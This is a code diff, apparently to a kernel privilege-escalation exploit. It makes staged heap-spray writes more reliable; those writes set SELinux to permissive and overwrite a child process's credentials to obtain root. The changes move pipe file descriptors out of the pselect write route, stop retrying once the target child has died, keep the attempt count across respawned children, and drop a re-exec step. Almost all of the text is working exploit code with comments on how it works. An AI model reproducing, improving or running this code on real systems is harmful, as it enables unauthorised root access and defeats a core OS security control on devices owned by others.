@@ -854,12 +854,26 @@ static void child_main(struct child_pipes *p) {
   park_rooted_child();
 }
 
+/* the pselect route dup2s its block fd over every low fd number whose fdset
+ * bit is set, and the waiter payload sets bits all over 0..319. the child
+ * pipes sit at 3..8, so the route eats them (read/write on a timerfd = EINVAL)
+ * on runs where the target's low bits land there. move them out of reach. */
+static int raise_pipe_fd(int fd) {
+  int high = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 96);
+  if (high < 0) {
+    pr_warning("pipe fd raise failed fd=%d errno=%d\n", fd, errno);
+    return fd;
+  }
+  close(fd);
+  return high;
+}
+
 static pid_t spawn_child(struct child_pipes *p) {
   int p1[2], p2[2], p3[2];
   if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
-  p->task_r = p1[0]; p->task_w = p1[1];
-  p->cmd_r = p2[0]; p->cmd_w = p2[1];
-  p->uid_r = p3[0]; p->uid_w = p3[1];
+  p->task_r = raise_pipe_fd(p1[0]); p->task_w = raise_pipe_fd(p1[1]);
+  p->cmd_r = raise_pipe_fd(p2[0]); p->cmd_w = raise_pipe_fd(p2[1]);
+  p->uid_r = raise_pipe_fd(p3[0]); p->uid_w = raise_pipe_fd(p3[1]);
   pid_t child = fork();
   if (child < 0) return -1;
   if (child == 0) { child_main(p); _exit(1); }
@@ -880,16 +894,29 @@ static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
 
 typedef int (*write_stage_verify_fn)(void *context);
 
+/* set by a verify fn when the target is gone for good (child exited). the
+ * stage loop stops immediately instead of paying 14 more heap sprays that
+ * cannot land on anything. */
+static int stage_target_gone;
+
 static int retry_write_stage(
     const char *stage, uintptr_t target, int mode, int attempts,
     useconds_t settle_usec, write_stage_verify_fn verify, void *context,
-    int leaf) {
+    int leaf, int attempt_base, int attempt_total) {
+  stage_target_gone = 0;
   for (int attempt = 1; attempt <= attempts; attempt++) {
-    pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
+    if (stage_target_gone) return 0;
     /* the previous attempt's write can land after its verify read; check
      * before paying for another heap spray */
     if (attempt > 1 && verify(context)) return 1;
-    if (attempt == 1) slab_drain();
+    if (attempt == 1) {
+      slab_drain();
+      /* attempt_base continues the count across redo passes, so a respawn
+       * shows 16/45 instead of restarting at 1/15 */
+      pr_info("%s: attempt %d/%d\n", stage, attempt_base + 1, attempt_total);
+    }
+    /* re-runs after a miss are silent: same route, fresh spray, wait+verify.
+     * just loops quietly until the write lands or attempts run out */
     int routed = do_one_write(target, stage, mode, leaf);
     if (!routed) {
       pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
@@ -922,11 +949,21 @@ struct w3_stage_context {
 
 static int verify_w2_stage(void *context) {
   struct w2_stage_context *stage = context;
-  if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;
+  if (write(stage->pipes->cmd_w, "C", 1) != 1) {
+    pr_warning("W2 verify: cmd pipe write failed errno=%d (child gone?)\n", errno);
+    stage_target_gone = 1;
+    return 0;
+  }
 
   uint32_t child_uid = 9999;
-  if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
-      (ssize_t)sizeof(child_uid)) {
+  ssize_t nr = read(stage->pipes->uid_r, &child_uid, sizeof(child_uid));
+  if (nr != (ssize_t)sizeof(child_uid)) {
+    /* read 0 = child exited without answering (a mis-aimed write killed it);
+     * a partial read or EINTR would land here too. this is the silent case:
+     * no "child uid =" line ever prints. */
+    pr_warning("W2 verify: no uid (read=%zd errno=%d); child did not answer\n",
+               nr, errno);
+    stage_target_gone = 1;
     return 0;
   }
   pr_info("child uid = %u\n", child_uid);
@@ -986,15 +1023,6 @@ static int verify_leaf_dir_stage(void *context) {
   return 0;
 }
 
-/* W1's spray/reclaim poisons the slab freelist for the rest of this process,
- * so pselect W2 keeps landing in the wrong slot until a fresh process (the
- * manual second run). tcp does not suffer this and stays in-process. */
-static void reexec_for_clean_w2(char **argv) {
-  pr_info("W1 complete; re-exec for clean W2 reclaim\n");
-  execv("/proc/self/exe", argv);
-  pr_warning("re-exec failed (errno=%d); continuing in-process\n", errno);
-}
-
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
   disable_rseq_for_thread();
@@ -1026,15 +1054,12 @@ int run_exploit(int argc, char **argv) {
     TIMER("pre-W1 drain");
     selinux_ok = retry_write_stage(
         "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
-        verify_selinux_stage, NULL, 0);
+        verify_selinux_stage, NULL, 0, 0, 15);
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
       return 1;
     }
     TIMER("Write 1 complete");
-    if (!tcp_route_selected()) {
-      reexec_for_clean_w2(argv);
-    }
   } else {
     pr_success("SELinux already permissive\n");
   }
@@ -1052,6 +1077,7 @@ int run_exploit(int argc, char **argv) {
   int ever_rooted = 0;
   pid_t parked_child = -1;
   int parked_cmd_w = -1;
+  int w2_attempt_base = 0; /* running W2 count across redo passes */
 
   /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
    * child, so respawn and redo. */
@@ -1149,13 +1175,19 @@ int run_exploit(int argc, char **argv) {
 
     int got_root = retry_write_stage(
         "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 100000,
-        verify_w2_stage, &w2_context, 0);
+        verify_w2_stage, &w2_context, 0,
+        w2_attempt_base, w2_attempt_base + 15);
     if (!got_root) {
-      write(pipes.cmd_w, "X", 1);
-      close(pipes.cmd_w); close(pipes.uid_r);
-      pr_warning("W2 failed after 15 rounds\n");
-      waitpid(child, NULL, WNOHANG);
-      return 1;
+      /* the write never landed. wait, then let the next round respawn the
+       * child fresh; the count continues rather than restarting. */
+      pr_warning("W2 wrote nothing; waiting 2s and redoing (round %d/3)\n",
+                 round);
+      w2_attempt_base += 15;
+      write(pipes.cmd_w, "X", 1);   /* child exits: no uid means not rooted */
+      waitpid(child, NULL, WNOHANG); /* round>1 cleanup closes the pipes */
+      child_alive = 0;
+      sleep(2);
+      continue; /* next round: fresh child, fresh spray, fresh route */
     }
     ever_rooted = 1;
     /* rooted children never exit; chain failures park (P) */
@@ -1181,7 +1213,7 @@ int run_exploit(int argc, char **argv) {
     if (!tcp_writes) {
       int dir_ok = retry_write_stage(
           "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-          verify_leaf_dir_stage, &w3_context, 1);
+          verify_leaf_dir_stage, &w3_context, 1, 0, 4);
       if (!dir_ok) {
         pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
       }
